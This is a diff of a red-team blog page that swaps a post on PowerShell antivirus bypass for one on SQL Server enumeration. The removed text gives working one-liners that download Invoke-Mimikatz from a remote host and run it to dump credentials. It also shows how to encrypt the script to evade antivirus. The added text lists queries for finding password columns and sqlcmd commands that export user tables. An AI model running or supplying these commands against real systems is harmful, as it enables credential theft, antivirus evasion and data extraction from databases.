@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Powershell bypass catch password, Yangsir">
+    <meta name="keywords" content="Sqlserver focus command, Yangsir">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Powershell bypass catch password | Yangsir</title>
+    <title>Sqlserver focus command | Yangsir</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/6.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812230930949.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Powershell bypass catch password</h1>
+                    <h1 class="description center-align post-title">Sqlserver focus command</h1>
                 </div>
             </div>
         </div>
@@ -436,20 +436,20 @@
                                 <span class="chip bg-color">Redteam</span>
                             </a>
                         
-                            <a href="/tags/Bypass/">
-                                <span class="chip bg-color">Bypass</span>
+                            <a href="/tags/Information-collection/">
+                                <span class="chip bg-color">Information collection</span>
                             </a>
                         
-                            <a href="/tags/Mimikatz/">
-                                <span class="chip bg-color">Mimikatz</span>
+                            <a href="/tags/Sqlserver/">
+                                <span class="chip bg-color">Sqlserver</span>
                             </a>
                         
-                            <a href="/tags/Catch-Password/">
-                                <span class="chip bg-color">Catch Password</span>
+                            <a href="/tags/Database/">
+                                <span class="chip bg-color">Database</span>
                             </a>
                         
-                            <a href="/tags/Powershell/">
-                                <span class="chip bg-color">Powershell</span>
+                            <a href="/tags/Command-execution/">
+                                <span class="chip bg-color">Command execution</span>
                             </a>
                         
                     </div>
@@ -460,8 +460,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Learning-record/" class="post-category">
-                                Learning record
+                            <a href="/categories/Miscellaneous-record/" class="post-category">
+                                Miscellaneous record
                             </a>
                         
                     </div>
@@ -473,21 +473,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-07-31
+                    2021-08-16
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-08-11
+                    2021-08-16
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    286
+                    322
                 </div>
                 
 
@@ -517,49 +517,35 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">From a practical point of view, solve the practical problems encountered, simple record, can bypass 360 and HuoRong<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <pre class="line-numbers language-none"><code class="language-none">A few days ago, I saw the blackmailing team tool released in the T00ls forum, and recorded some tips that the red team can use<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">According to PowerShell&#39;s default policy, ps1 scripts are not allowed to execute
+<h2 id="View-the-host-name-and-user-connected-to-the-database"><a href="#View-the-host-name-and-user-connected-to-the-database" class="headerlink" title="View the host name and user connected to the database"></a>View the host name and user connected to the database</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> loginame<span class="token punctuation">,</span> hostname <span class="token keyword">from</span> sys<span class="token punctuation">.</span>sysprocesses<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-Get-executionpolicy indicates that the current policy is Restricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812230659893.png"></p>
+<h2 id="Obtaining-Database-Information"><a href="#Obtaining-Database-Information" class="headerlink" title="Obtaining Database Information"></a>Obtaining Database Information</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysdatabases<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/1.png"></p>
-<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">You can change the execution policy with the administrator permission<span class="token punctuation">.</span> <span class="token keyword">Do</span> not ask me why I have the administrator permission<span class="token punctuation">.</span> You can not <span class="token keyword">catch</span> passwords with the normal user
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812230748957.png"></p>
+<h3 id="Obtain-the-database-size-information"><a href="#Obtain-the-database-size-information" class="headerlink" title="Obtain the database size information"></a>Obtain the database size information</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> d<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token function">ROUND</span><span class="token punctuation">(</span><span class="token function">SUM</span><span class="token punctuation">(</span>mf<span class="token punctuation">.</span>size<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>master_files mf <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> sys<span class="token punctuation">.</span><span class="token keyword">databases</span> d <span class="token keyword">ON</span> d<span class="token punctuation">.</span>database_id <span class="token operator">=</span> mf<span class="token punctuation">.</span>database_id <span class="token keyword">WHERE</span> d<span class="token punctuation">.</span>database_id <span class="token operator">></span> <span class="token number">4</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> d<span class="token punctuation">.</span>name <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> d<span class="token punctuation">.</span>name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<span class="token function">Set-ExecutionPolicy</span> Unrestricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812230930949.png"></p>
+<h2 id="Specifies-all-tables-in-the-database"><a href="#Specifies-all-tables-in-the-database" class="headerlink" title="Specifies all tables in the database"></a>Specifies all tables in the database</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlcmd <span class="token operator">-</span>S localhost <span class="token operator">-</span>U sa <span class="token operator">-</span>P admin  <span class="token operator">-</span>Q <span class="token string">"use LazyOA; exec sp_tables"</span> <span class="token operator">-</span>W<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/2.png"></p>
-<h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="PSV2"><a href="#PSV2" class="headerlink" title="PSV2"></a>PSV2</h3><pre class="line-numbers language-none"><code class="language-none">as we all known the easy way like this
-powershell -exec bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.159.1:8888&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;
-
-now you can use the v2 maybe can bypass some av like this
-powershell -Version 2 -exec bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.159.1:8888&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/3.png"></p>
-<h3 id="Encode-script"><a href="#Encode-script" class="headerlink" title="Encode script"></a>Encode script</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">as we all know the Powersploit project<span class="token punctuation">,</span> how about use this project to bypass?
-
-Here we use the <span class="token function">out-encryptedScript</span> to place the script in the same directory as the MimiKatz script<span class="token punctuation">,</span> and then encrypt it in turn
-
-<span class="token function">Import-Module</span> <span class="token punctuation">.</span>\<span class="token function">Out-EncryptedScript</span><span class="token punctuation">.</span>ps1
-<span class="token function">Out-EncryptedScript</span> <span class="token operator">-</span>ScriptPath <span class="token punctuation">.</span>\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1 <span class="token operator">-</span>Password woshijiamide <span class="token operator">-</span>Salt safety<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/4.png">```</p>
-<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">let our ps1script up to our tar then like this
-
-powershell<span class="token punctuation">.</span>exe
-<span class="token function">IEX</span><span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">"http://192.168.159.1:8888/Out-EncryptedScript.ps1"</span><span class="token punctuation">)</span> 
-<span class="token namespace">[String]</span> <span class="token variable">$cmd</span> = <span class="token function">Get-Content</span> <span class="token punctuation">.</span>\new1<span class="token punctuation">.</span>ps1
-<span class="token function">Invoke-Expression</span> <span class="token variable">$cmd</span>
-<span class="token variable">$decrypted</span> = de woshijiamide safety
-<span class="token function">Invoke-Expression</span> <span class="token variable">$decrypted</span>
-<span class="token function">Invoke-Mimikatz</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/5.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">the same way, Of course, both files are put remote, also does not affect the final effect 
-
-maybe will get some wrong, but we also can catch PW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/6.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812233307074.png"></p>
+<h2 id="Specifies-the-number-of-database-rows"><a href="#Specifies-the-number-of-database-rows" class="headerlink" title="Specifies the number of database rows"></a>Specifies the number of database rows</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">USE</span> LazyOA <span class="token keyword">SELECT</span> <span class="token keyword">TOP</span> <span class="token number">100</span> s<span class="token punctuation">.</span>Name <span class="token keyword">AS</span> SchemaName<span class="token punctuation">,</span> t<span class="token punctuation">.</span>Name <span class="token keyword">AS</span> TableName<span class="token punctuation">,</span> p<span class="token punctuation">.</span><span class="token keyword">rows</span> <span class="token keyword">AS</span> RowCounts<span class="token punctuation">,</span> CAST<span class="token punctuation">(</span><span class="token function">ROUND</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">SUM</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>total_pages<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">128.00</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">NUMERIC</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> Total_MB <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span><span class="token keyword">tables</span> t <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> sys<span class="token punctuation">.</span>indexes i <span class="token keyword">ON</span> t<span class="token punctuation">.</span>OBJECT_ID <span class="token operator">=</span> i<span class="token punctuation">.</span>object_id <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> sys<span class="token punctuation">.</span>partitions p <span class="token keyword">ON</span> i<span class="token punctuation">.</span>object_id <span class="token operator">=</span> p<span class="token punctuation">.</span>OBJECT_ID <span class="token operator">AND</span> i<span class="token punctuation">.</span>index_id <span class="token operator">=</span> p<span class="token punctuation">.</span>index_id <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> sys<span class="token punctuation">.</span>allocation_units a <span class="token keyword">ON</span> p<span class="token punctuation">.</span>partition_id <span class="token operator">=</span> a<span class="token punctuation">.</span>container_id <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> sys<span class="token punctuation">.</span>schemas s <span class="token keyword">ON</span> t<span class="token punctuation">.</span>schema_id <span class="token operator">=</span> s<span class="token punctuation">.</span>schema_id <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> t<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> s<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> p<span class="token punctuation">.</span><span class="token keyword">Rows</span> <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> RowCounts <span class="token keyword">desc</span><span class="token punctuation">,</span> Total_MB  <span class="token keyword">desc</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812231339381.png"></p>
+<h2 id="Specifies-the-rows-in-the-data-table"><a href="#Specifies-the-rows-in-the-data-table" class="headerlink" title="Specifies the rows in the data table"></a>Specifies the rows in the data table</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> LazyOA<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>Sys_Role<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812231646980.png" alt="image-20210812230659893"></p>
+<h2 id="Specifies-the-first-10-entries-in-the-data-table"><a href="#Specifies-the-first-10-entries-in-the-data-table" class="headerlink" title="Specifies the first 10 entries in the data table"></a>Specifies the first 10 entries in the data table</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token keyword">from</span> LazyOA<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>Sys_Role<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812231817603.png" alt="image-20210812230659893"></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">use</span> LazyOA<span class="token punctuation">;</span> <span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token keyword">from</span> Sys_Role<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812231921294.png" alt="image-20210812230659893"></p>
+<h2 id="Specify-database-column-name-search"><a href="#Specify-database-column-name-search" class="headerlink" title="Specify database column name search"></a>Specify database column name search</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> COLUMN_NAME <span class="token keyword">as</span> <span class="token string">'ColumnName'</span><span class="token punctuation">,</span> TABLE_NAME <span class="token keyword">as</span>  <span class="token string">'TableName'</span> <span class="token keyword">from</span> LazyOA<span class="token punctuation">.</span>INFORMATION_SCHEMA<span class="token punctuation">.</span><span class="token keyword">COLUMNS</span> <span class="token keyword">where</span> COLUMN_NAME <span class="token operator">like</span> <span class="token string">'%pass%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812232042788.png" alt="image-20210812230659893"></p>
+<h2 id="Specifying-data-Export"><a href="#Specifying-data-Export" class="headerlink" title="Specifying data Export"></a>Specifying data Export</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">本地账户登录认证
+sqlcmd<span class="token punctuation">.</span>exe <span class="token operator">-</span>S localhost <span class="token operator">-</span>E <span class="token operator">-</span>Q <span class="token string">"select * from %databasename%.dbo.%tablename%"</span> <span class="token operator">-</span>W <span class="token operator">-</span>s<span class="token string">"|"</span> <span class="token operator">-</span>o <span class="token string">"C:\Windows\Temp\1.txt"</span>
+指定账户密码登录认证
+sqlcmd<span class="token punctuation">.</span>exe <span class="token operator">-</span>S localhost <span class="token operator">-</span>U sa <span class="token operator">-</span>P admin  <span class="token operator">-</span>Q <span class="token string">"select * from LazyOA.dbo.Sys_User"</span> <span class="token operator">-</span>W <span class="token operator">-</span>s<span class="token string">"|"</span> <span class="token operator">-</span>o <span class="token string">"C:\Users\dbadmin\Desktop\1\1.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812233018443.png" alt="image-20210812230659893"></p>
 
                 
             </div>
@@ -586,7 +572,7 @@ maybe will get some wrong, but we also can catch PW<span aria-hidden="true" clas
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://yangsirrr.github.io/2021/07/31/powershell-bypass-catch-password/">https://yangsirrr.github.io/2021/07/31/powershell-bypass-catch-password/</a>
+                    <a href="https://yangsirrr.github.io/2021/08/16/sqlserver-focus-command/">https://yangsirrr.github.io/2021/08/16/sqlserver-focus-command/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -628,20 +614,20 @@ maybe will get some wrong, but we also can catch PW<span aria-hidden="true" clas
                                     <span class="chip bg-color">Redteam</span>
                                 </a>
                             
-                                <a href="/tags/Bypass/">
-                                    <span class="chip bg-color">Bypass</span>
+                                <a href="/tags/Information-collection/">
+                                    <span class="chip bg-color">Information collection</span>
                                 </a>
                             
-                                <a href="/tags/Mimikatz/">
-                                    <span class="chip bg-color">Mimikatz</span>
+                                <a href="/tags/Sqlserver/">
+                                    <span class="chip bg-color">Sqlserver</span>
                                 </a>
                             
-                                <a href="/tags/Catch-Password/">
-                                    <span class="chip bg-color">Catch Password</span>
+                                <a href="/tags/Database/">
+                                    <span class="chip bg-color">Database</span>
                                 </a>
                             
-                                <a href="/tags/Powershell/">
-                                    <span class="chip bg-color">Powershell</span>
+                                <a href="/tags/Command-execution/">
+                                    <span class="chip bg-color">Command execution</span>
                                 </a>
                             
                         </div>
@@ -687,16 +673,17 @@ maybe will get some wrong, but we also can catch PW<span aria-hidden="true" clas
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2021/08/01/a-solution-to-the-failure-of-the-trust-relationship-between-this-workstation-and-the-primary-domain/">
+                <a href="/2021/08/16/sqlserver-focus-command/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801231855683.png" class="responsive-img" alt="A solution to the failure of the trust relationship between this workstation and the primary domain">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812230930949.png" class="responsive-img" alt="Sqlserver focus command">
                         
-                        <span class="card-title">A solution to the failure of the trust relationship between this workstation and the primary domain</span>
+                        <span class="card-title">Sqlserver focus command</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -706,30 +693,43 @@ maybe will get some wrong, but we also can catch PW<span aria-hidden="true" clas
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-01
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Tips/" class="post-category">
-                                    Tips
+                            <a href="/categories/Miscellaneous-record/" class="post-category">
+                                    Miscellaneous record
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Domain-environment/">
-                        <span class="chip bg-color">Domain environment</span>
+                    <a href="/tags/Redteam/">
+                        <span class="chip bg-color">Redteam</span>
                     </a>
                     
-                    <a href="/tags/Operations/">
-                        <span class="chip bg-color">Operations</span>
+                    <a href="/tags/Information-collection/">
+                        <span class="chip bg-color">Information collection</span>
+                    </a>
+                    
+                    <a href="/tags/Sqlserver/">
+                        <span class="chip bg-color">Sqlserver</span>
+                    </a>
+                    
+                    <a href="/tags/Database/">
+                        <span class="chip bg-color">Database</span>
+                    </a>
+                    
+                    <a href="/tags/Command-execution/">
+                        <span class="chip bg-color">Command execution</span>
                     </a>
                     
                 </div>
@@ -743,12 +743,12 @@ maybe will get some wrong, but we also can catch PW<span aria-hidden="true" clas
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/07/30/exchange-export-email-methods/">
+                <a href="/2021/08/16/adcs-esc1-esc8-gong-ji-fang-shi/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.29.png" class="responsive-img" alt="Exchange Export email methods">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816200142115.png" class="responsive-img" alt="ADCS&amp;ESC1&amp;ESC8攻击方式">
                         
-                        <span class="card-title">Exchange Export email methods</span>
+                        <span class="card-title">ADCS&amp;ESC1&amp;ESC8攻击方式</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -759,14 +759,14 @@ maybe will get some wrong, but we also can catch PW<span aria-hidden="true" clas
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-30
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-16
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Tips/" class="post-category">
-                                    Tips
+                            <a href="/categories/Learning-record/" class="post-category">
+                                    Learning record
                                 </a>
                             
                             
@@ -776,24 +776,28 @@ maybe will get some wrong, but we also can catch PW<span aria-hidden="true" clas
                 
                 <div class="card-action article-tags">
                     
+                    <a href="/tags/Domain-environment/">
+                        <span class="chip bg-color">Domain environment</span>
+                    </a>
+                    
                     <a href="/tags/Redteam/">
                         <span class="chip bg-color">Redteam</span>
                     </a>
                     
-                    <a href="/tags/Exchange/">
-                        <span class="chip bg-color">Exchange</span>
+                    <a href="/tags/ADCS/">
+                        <span class="chip bg-color">ADCS</span>
                     </a>
                     
-                    <a href="/tags/Information-collection/">
-                        <span class="chip bg-color">Information collection</span>
+                    <a href="/tags/ESC1/">
+                        <span class="chip bg-color">ESC1</span>
                     </a>
                     
-                    <a href="/tags/Export-Email/">
-                        <span class="chip bg-color">Export Email</span>
+                    <a href="/tags/ESC8/">
+                        <span class="chip bg-color">ESC8</span>
                     </a>
                     
-                    <a href="/tags/Search-Email/">
-                        <span class="chip bg-color">Search Email</span>
+                    <a href="/tags/PTT/">
+                        <span class="chip bg-color">PTT</span>
                     </a>
                     
                 </div>
